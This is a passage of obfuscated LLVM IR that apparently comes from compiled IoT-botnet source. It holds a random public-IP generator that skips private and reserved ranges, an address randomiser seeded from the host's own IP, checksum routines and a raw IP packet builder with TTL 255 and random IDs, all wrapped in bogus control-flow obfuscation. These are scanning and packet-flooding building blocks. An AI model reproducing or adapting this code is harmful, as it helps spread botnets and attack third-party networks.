  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 11
  br i1 %301, label %422, label %302

; <label>:302:                                    ; preds = %298
  %303 = load i32, i32* @x.69
  %304 = load i32, i32* @y.70
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %302
  %311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 21
  %314 = load i32, i32* @x.69
  %315 = load i32, i32* @y.70
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %313, label %422, label %322

; <label>:322:                                    ; preds = %originalBBpart248
  %323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 22
  br i1 %325, label %422, label %326

; <label>:326:                                    ; preds = %322
  %327 = load i32, i32* @x.69
  %328 = load i32, i32* @y.70
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %326
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 26
  %338 = load i32, i32* @x.69
  %339 = load i32, i32* @y.70
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %337, label %422, label %346

; <label>:346:                                    ; preds = %originalBBpart252
  %347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %348 = zext i8 %347 to i32
  %349 = icmp eq i32 %348, 28
  br i1 %349, label %422, label %350

; <label>:350:                                    ; preds = %346
  %351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 29
  br i1 %353, label %422, label %354

; <label>:354:                                    ; preds = %350
  %355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 30
  br i1 %357, label %422, label %358

; <label>:358:                                    ; preds = %354
  %359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 33
  br i1 %361, label %422, label %362

; <label>:362:                                    ; preds = %358
  %363 = load i32, i32* @x.69
  %364 = load i32, i32* @y.70
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %362
  %371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 55
  %374 = load i32, i32* @x.69
  %375 = load i32, i32* @y.70
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %373, label %422, label %382

; <label>:382:                                    ; preds = %originalBBpart256
  %383 = load i32, i32* @x.69
  %384 = load i32, i32* @y.70
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %382
  %391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 214
  %394 = load i32, i32* @x.69
  %395 = load i32, i32* @y.70
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %393, label %422, label %402

; <label>:402:                                    ; preds = %originalBBpart260
  %403 = load i32, i32* @x.69
  %404 = load i32, i32* @y.70
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %402
  %411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %412 = zext i8 %411 to i32
  %413 = icmp eq i32 %412, 215
  %414 = load i32, i32* @x.69
  %415 = load i32, i32* @y.70
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %422

; <label>:422:                                    ; preds = %originalBBpart264, %originalBBpart260, %originalBBpart256, %358, %354, %350, %346, %originalBBpart252, %322, %originalBBpart248, %298, %originalBBpart244, %274
  %423 = phi i1 [ true, %originalBBpart260 ], [ true, %originalBBpart256 ], [ true, %358 ], [ true, %354 ], [ true, %350 ], [ true, %346 ], [ true, %originalBBpart252 ], [ true, %322 ], [ true, %originalBBpart248 ], [ true, %298 ], [ true, %originalBBpart244 ], [ true, %274 ], [ %413, %originalBBpart264 ]
  br label %424

; <label>:424:                                    ; preds = %422, %270, %originalBBpart240, %originalBBpart236, %originalBBpart232, %170, %originalBBpart220, %originalBBpart216, %originalBBpart212, %originalBBpart28, %originalBBpart24, %38, %34, %originalBBpart2
  %425 = phi i1 [ true, %270 ], [ true, %originalBBpart240 ], [ true, %originalBBpart236 ], [ true, %originalBBpart232 ], [ true, %170 ], [ true, %originalBBpart220 ], [ true, %originalBBpart216 ], [ true, %originalBBpart212 ], [ true, %originalBBpart28 ], [ true, %originalBBpart24 ], [ true, %38 ], [ true, %34 ], [ true, %originalBBpart2 ], [ %423, %422 ]
  br i1 %425, label %426, label %439

; <label>:426:                                    ; preds = %424
  %427 = call i32 @rand() #2
  %428 = srem i32 %427, 223
  %429 = trunc i32 %428 to i8
  store i8 %429, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %430 = call i32 @rand() #2
  %431 = srem i32 %430, 255
  %432 = trunc i32 %431 to i8
  store i8 %432, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %433 = call i32 @rand() #2
  %434 = srem i32 %433, 255
  %435 = trunc i32 %434 to i8
  store i8 %435, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %436 = call i32 @rand() #2
  %437 = srem i32 %436, 255
  %438 = trunc i32 %437 to i8
  store i8 %438, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:439:                                    ; preds = %424
  %440 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %440, i8 0, i64 16, i32 16, i1 false)
  %441 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %442 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %443 = zext i8 %442 to i32
  %444 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %445 = zext i8 %444 to i32
  %446 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %447 = zext i8 %446 to i32
  %448 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %449 = zext i8 %448 to i32
  %450 = call i32 (i8*, i8*, ...) @szprintf(i8* %441, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.136, i32 0, i32 0), i32 %443, i32 %445, i32 %447, i32 %449)
  %451 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %452 = call i32 @inet_addr(i8* %451) #2
  ret i32 %452

originalBBalteredBB:                              ; preds = %originalBB, %14
  %453 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %454 = zext i8 %453 to i32
  %455 = icmp eq i32 %454, 127
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %456 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %457 = zext i8 %456 to i32
  %458 = icmp eq i32 %457, 15
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %460 = zext i8 %459 to i32
  %461 = icmp eq i32 %460, 16
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %82
  %462 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %463 = zext i8 %462 to i32
  %464 = icmp eq i32 %463, 56
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %102
  %465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 10
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %126
  %468 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %469 = zext i8 %468 to i32
  %470 = icmp eq i32 %469, 168
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %150
  %471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %472 = zext i8 %471 to i32
  %473 = icmp sge i32 %472, 16
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %178
  %474 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %475 = zext i8 %474 to i32
  %476 = icmp sge i32 %475, 64
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %198
  %477 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %478 = zext i8 %477 to i32
  %479 = icmp slt i32 %478, 127
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %222
  %480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %481 = zext i8 %480 to i32
  %482 = icmp sgt i32 %481, 254
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %250
  %483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %484 = zext i8 %483 to i32
  %485 = icmp slt i32 %484, 20
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %278
  %486 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %487 = zext i8 %486 to i32
  %488 = icmp eq i32 %487, 7
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %302
  %489 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 21
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %326
  %492 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %493 = zext i8 %492 to i32
  %494 = icmp eq i32 %493, 26
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %362
  %495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %496 = zext i8 %495 to i32
  %497 = icmp eq i32 %496, 55
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %382
  %498 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %499 = zext i8 %498 to i32
  %500 = icmp eq i32 %499, 214
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %402
  %501 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %502 = zext i8 %501 to i32
  %503 = icmp eq i32 %502, 215
  br label %originalBB62
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %25, %2
  %7 = load i32, i32* @x.73
  %8 = load i32, i32* @y.74
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  %17 = load i32, i32* @x.73
  %18 = load i32, i32* @y.74
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %34

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i16*, i16** %3, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %3, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %5, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %5, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %4, align 4
  br label %6

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* @x.73
  %36 = load i32, i32* @y.74
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = icmp sgt i32 %43, 0
  %45 = load i32, i32* @x.73
  %46 = load i32, i32* @y.74
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %44, label %53, label %60

; <label>:53:                                     ; preds = %originalBBpart24
  %54 = load i16*, i16** %3, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %5, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %5, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %originalBBpart24
  br label %61

; <label>:61:                                     ; preds = %65, %60
  %62 = load i64, i64* %5, align 8
  %63 = lshr i64 %62, 16
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %71

; <label>:65:                                     ; preds = %61
  %66 = load i64, i64* %5, align 8
  %67 = and i64 %66, 65535
  %68 = load i64, i64* %5, align 8
  %69 = lshr i64 %68, 16
  %70 = add i64 %67, %69
  store i64 %70, i64* %5, align 8
  br label %61

; <label>:71:                                     ; preds = %61
  %72 = load i64, i64* %5, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %6
  %75 = load i32, i32* %4, align 4
  %76 = icmp sgt i32 %75, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %77 = load i32, i32* %4, align 4
  %78 = icmp sgt i32 %77, 0
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.75
  %4 = load i32, i32* @y.76
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #2
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #2
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.75
  %54 = load i32, i32* @y.76
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #13
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #2
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #2
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
